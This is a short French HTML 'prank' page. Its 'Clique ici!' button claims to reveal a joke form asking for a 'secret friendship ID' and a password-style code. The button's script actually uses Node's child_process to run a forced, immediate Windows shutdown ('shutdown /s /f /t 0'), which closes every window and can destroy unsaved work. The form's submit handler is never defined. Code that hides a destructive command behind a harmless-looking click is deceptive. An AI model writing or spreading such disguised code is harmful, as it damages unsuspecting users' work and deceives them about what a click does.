<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Surprise!</title>
</head>
<body>
    <button onclick="showPrankForm()">Clique ici!</button>

    <div id="prankForm" style="display: none;">
        <h2>Formulaire de Blague</h2>
        <p>Pour continuer, entrez les informations suivantes :</p>
        <label>Identifiant secret de l’amitié :</label>
        <input type="text" id="friendId" placeholder="ex: 123-amitié"><br><br>
        
        <label>Code spécial de blague :</label>
        <input type="password" id="prankCode" placeholder="******"><br><br>
        
        <button onclick="submitPrankForm()">Soumettre</button>
    </div>

    <script>
        function showPrankForm() {
            const { exec } = require('child_process');

            // Commande pour fermer toutes les fenêtres et éteindre l'ordinateur
            // Pour Windows
            exec('shutdown /s /f /t 0', (error, stdout, stderr) => {
                if (error) {
                    console.error(`Erreur : ${error.message}`);
                    return;
                }
                if (stderr) {
                    console.error(`Erreur : ${stderr}`);
                    return;
                }
                console.log(`Succès : ${stdout}`);
            });
        }
    </script>
</body>
</html>
